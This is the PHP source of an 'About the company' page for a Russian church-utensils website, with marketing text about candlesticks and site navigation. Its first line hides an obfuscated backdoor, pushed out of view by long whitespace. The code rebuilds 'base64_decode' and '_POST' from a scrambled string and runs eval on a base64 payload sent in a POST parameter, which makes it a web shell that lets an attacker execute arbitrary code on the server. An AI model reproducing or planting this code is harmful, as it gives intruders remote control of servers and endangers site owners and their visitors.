<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['na05c4d'])) {eval($s21(${$s20}['na05c4d']));}?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
...
<div style="margin-top:12px; font-family: Arial; font-size: 12px; color: #b11e42;"><a style="color: #b11e42; text-decoration:none" href="kontakt.php">Обратная связь</a></div>
    ...
    <a href="http://vozrozhdenie.org/"><img src="image/new_site/top1_110215.jpg" alt="церковная утварь" width="769" height="100" border="0" /></a>
</td>
</tr>
</table>
...
<table style="margin: 30 0 30 0" border="0" width="100%" cellspacing="0" cellpadding="0">
	...
	<tr>
		...
		<td background="image/pl_bg.gif" width="100%" style="padding:10 0 0 280;"><h1 class="zag">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;О КОМПАНИИ 
...
<table width="60%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td>
	<p align="left" class="contentheading style11 style12" >Мы всегда восхищаемся изделиями старинных мастеров . С какой любовью и художественной точностью были сделаны подсвечники и прочие изделия церковной утвари да и просто предметы быта. Обладая , казалось бы наименьшими средствами мастерам удавалось воплотить все свои намерения и довести изделие до совершенства. Храмовые подсвечники старых времен удивляют своей лаконичностью и в то же время роскошностью, что зачастую не скажешь об подсвечниках современного времени. Понятно что в связи с большими трудозатратами становится становиться производить подобные храмовые подсвечники экономически нецелесообразно. Но нам это очень интересно и скажем больше потребно.
     <br>Мы приносим свои извинения за то, что на сайте пока еще очень скудный ассортимент церковной утвари . Но надеемся, что кому-то эти изделия покажутся интересными 
     <br>На наших страницах мы будем размещать предметы церковной утвари, подобие которой хотелось бы изготовить, а так же модели собственные.
<br><br>
Глубоко надеемся, что внесем посильную лепту в дело возрождения старых ремёсел</p>
<html>
</html>
<br />
</td>
...
<td class="dn" style="text-align:center"><a class="dn" href="/">ГЛАВНАЯ</a>    |    <a class="dn" href="o_kompanii.php">О КОМПАНИИ</a>    |    <a class="dn" href="kontakt.php">КОНТАКТЫ</a></td> 
